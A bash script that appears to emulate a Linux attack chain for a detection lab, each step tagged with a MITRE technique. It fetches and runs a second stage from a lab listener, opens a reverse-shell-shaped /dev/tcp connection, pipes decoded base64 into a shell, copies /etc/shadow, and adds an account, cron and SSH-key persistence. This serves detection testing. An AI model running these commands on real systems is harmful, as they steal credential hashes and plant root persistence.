#!/bin/bash
# Synthetic attack chain. Runs only inside the disposable sensor container and
# talks only to the lab listener container. Nothing here is harmful outside it.

# Ground truth marker, not part of the attack. The ParentProcessId of this event is the
# attack root PID in Sysmon's own numbering. See docs/DESIGN_NOTES.md.
printenv LAB_ATTACK_ROOT_MARKER > /dev/null

# T1105 download a second stage to a hidden file, T1059.004 run it
curl -s -m 3 -o /tmp/.stage1.sh http://listener:8000/stage1.sh
chmod +x /tmp/.stage1.sh
/bin/sh /tmp/.stage1.sh > /dev/null
sleep 1

# T1059.004 outbound connection from a shell, the shape of a reverse shell.
# It sends one line of text and closes. No command is read back.
bash -c 'exec 3<>/dev/tcp/listener/4444; echo "hello from lab" >&3; exec 3>&-'
sleep 1

# T1140 decode text and pipe it into a shell. It decodes to: id
echo "aWQ=" | base64 -d | sh > /dev/null
sleep 1

# T1003.008 copy the password hashes
cat /etc/shadow > /tmp/.s
sleep 1

# T1136.001 create a local account
useradd -m svc_backup
sleep 1

# T1053.003 cron persistence
echo "*/5 * * * * root /tmp/.stage1.sh" > /etc/cron.d/sys-update
sleep 1

# T1098.004 SSH key persistence, with a fake key
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAsyntheticlabkeynotreal lab@attacker.test" > /root/.ssh/authorized_keys
sleep 1

# T1070.004 remove tools
rm -f /tmp/.stage1.sh /tmp/.s
